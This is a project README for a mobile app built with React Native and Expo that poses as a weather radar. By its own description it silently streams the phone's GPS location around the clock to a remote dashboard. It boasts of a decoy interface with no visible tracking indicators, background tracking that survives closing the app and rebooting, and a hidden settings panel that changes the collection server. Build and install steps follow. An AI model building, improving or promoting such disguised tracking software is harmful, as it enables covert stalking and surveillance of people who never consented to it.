# Weather Radar - Stealth Mobile Application

> **Short Description:**
> An authentic Weather Radar mobile application built with **React Native** & **Expo SDK 54**. Disguised as a weather app, it silently streams 24/7 background GPS coordinates to a central location dashboard via Android Foreground Services and `expo-task-manager`.

---

## 📱 Features

- **🌤️ Authentic Decoy UI**: Displays real-time local weather (temperature, condition, hourly forecasts, 7-day outlook, wind, humidity, UV index). Zero visible tracking indicators.
- **🔄 24/7 OS Kernel Tracking**: Leverages `expo-task-manager` and `expo-location` to stream GPS data continuously in the background even when closed or after phone reboots.
- **⚙️ Hidden Server Configuration**: Tapping the top-right ⚙️ gear icon opens a hidden settings modal to update the backend endpoint URL.
- **🚀 Expo SDK 54 Native**: Compatible with Expo Go and standalone native builds.

---

## 🛠️ Installation & Usage

### 1. Install Dependencies
```bash
cd mobile-app
npm install
```

### 2. Launch Expo Bundler
```bash
npx expo start
```

### 3. Open on Mobile Device
- Scan the QR code using **Expo Go** (available on Play Store & App Store).
- Grant location permissions when prompted (*"Allow all the time"*).

### 4. Build Standalone APK
```bash
npx eas build --platform android --profile preview
```
